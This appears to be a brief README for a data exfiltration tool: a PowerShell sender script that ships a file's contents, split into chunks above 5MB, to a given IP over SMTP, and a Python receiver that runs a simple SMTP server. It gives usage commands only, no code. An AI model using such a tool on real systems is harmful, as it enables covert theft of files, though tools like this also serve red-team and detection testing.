# Simple SMTP data exfiltration

SENDER:
.\sender.ps1 [file_path] [ip]

Sends the content of a file to the given IP, using the SMTP protocol.
If the file size is > than 5MB, it'll be divided into chunks.

RECEIVER:
pip install -r requirements.txt
python3 receiver.py

Simple SMTP server.
